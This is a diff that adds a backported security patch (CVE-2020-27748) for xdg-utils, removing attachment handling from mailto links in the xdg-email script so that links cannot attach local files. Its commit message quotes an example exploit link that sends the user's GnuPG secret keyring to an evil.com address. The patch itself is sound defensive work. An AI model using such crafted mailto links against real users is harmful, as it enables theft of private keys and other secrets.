@@ -1,0 +1,58 @@
+From 1f199813e0eb0246f63b54e9e154970e609575af Mon Sep 17 00:00:00 2001
+From: =?UTF-8?q?J=C3=B6rg=20Thalheim?= <joerg@thalheim.io>
+Date: Tue, 18 Aug 2020 16:52:24 +0100
+Subject: [PATCH] xdg-email: remove attachment handling from mailto
+MIME-Version: 1.0
+Content-Type: text/plain; charset=UTF-8
+Content-Transfer-Encoding: 8bit
+
+This allows attacker to extract secrets from users:
+
+mailto:sid@evil.com?attach=/.gnupg/secring.gpg
+
+See also https://bugzilla.mozilla.org/show_bug.cgi?id=1613425
+and https://gitlab.freedesktop.org/xdg/xdg-utils/-/issues/177
+
+Signed-off-by: Jörg Thalheim <joerg@thalheim.io>
+---
+ scripts/xdg-email.in | 7 +------
+ 1 file changed, 1 insertion(+), 6 deletions(-)
+
+Upstream-Status: Backport
+CVE: CVE-2020-27748
+
+diff --git a/scripts/xdg-email.in b/scripts/xdg-email.in
+index 6db58ad..5d2f4f3 100644
+--- a/scripts/xdg-email.in
++++ b/scripts/xdg-email.in
+@@ -32,7 +32,7 @@ _USAGE
+ 
+ run_thunderbird()
+ {
+-    local THUNDERBIRD MAILTO NEWMAILTO TO CC BCC SUBJECT BODY ATTACH
++    local THUNDERBIRD MAILTO NEWMAILTO TO CC BCC SUBJECT BODY
+     THUNDERBIRD="$1"
+     MAILTO=$(echo "$2" | sed 's/^mailto://')
+     echo "$MAILTO" | grep -qs "^?"
+@@ -48,7 +48,6 @@ run_thunderbird()
+     BCC=$(/bin/echo -e $(echo "$MAILTO" | grep '^bcc=' | sed 's/^bcc=//;s/%\(..\)/\\x\1/g' | awk '{ printf "%s,",$0 }'))
+     SUBJECT=$(echo "$MAILTO" | grep '^subject=' | tail -n 1)
+     BODY=$(echo "$MAILTO" | grep '^body=' | tail -n 1)
+-    ATTACH=$(/bin/echo -e $(echo "$MAILTO" | grep '^attach=' | sed 's/^attach=//;s/%\(..\)/\\x\1/g' | awk '{ printf "%s,",$0 }' | sed 's/,$//'))
+ 
+     if [ -z "$TO" ] ; then
+         NEWMAILTO=
+@@ -68,10 +67,6 @@ run_thunderbird()
+         NEWMAILTO="${NEWMAILTO},$BODY"
+     fi
+ 
+-    if [ -n "$ATTACH" ] ; then
+-        NEWMAILTO="${NEWMAILTO},attachment='${ATTACH}'"
+-    fi
+-
+     NEWMAILTO=$(echo "$NEWMAILTO" | sed 's/^,//')
+     DEBUG 1 "Running $THUNDERBIRD -compose \"$NEWMAILTO\""
+     "$THUNDERBIRD" -compose "$NEWMAILTO"
+-- 
+GitLab
+
